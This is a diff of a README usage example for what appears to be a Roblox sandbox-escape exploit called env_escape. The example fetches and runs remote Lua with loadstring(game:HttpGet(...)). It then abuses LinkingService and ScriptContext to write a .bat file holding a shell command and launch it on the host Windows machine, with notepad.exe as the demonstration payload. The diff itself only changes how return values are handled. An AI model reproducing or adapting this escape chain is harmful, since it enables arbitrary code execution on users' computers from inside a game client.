@@ -14,15 +14,15 @@ local bypassed_env = loadstring(game:HttpGet("https://raw.githubusercontent.com/
 
 Full example:
 ```Lua
-local bypassed_env, why = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
+local bypassed_env, why, why_full = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
 
-if bypassed_env ~= "Failed" and bypassed_env ~= "UnSupported" then
+if why ~= "Failed" and why ~= "UnSupported" then
 	local L, S = bypassed_env.game:GetService("LinkingService"), bypassed_env.game:GetService("ScriptContext")
-	L:OpenUrl(S:SaveScriptProfilingData([[START C:\WINDOWS\system32\notepad.exe]], "lol.bat"))
-elseif why ~= nil then
-	print(why)
+    L:OpenUrl(S:SaveScriptProfilingData([[START C:\WINDOWS\system32\notepad.exe]], "lol.bat"))
+elseif why_full ~= nil then
+    print(why_full)
 else
-    print(bypassed_env)
+    print(why)
 end
 ```
 
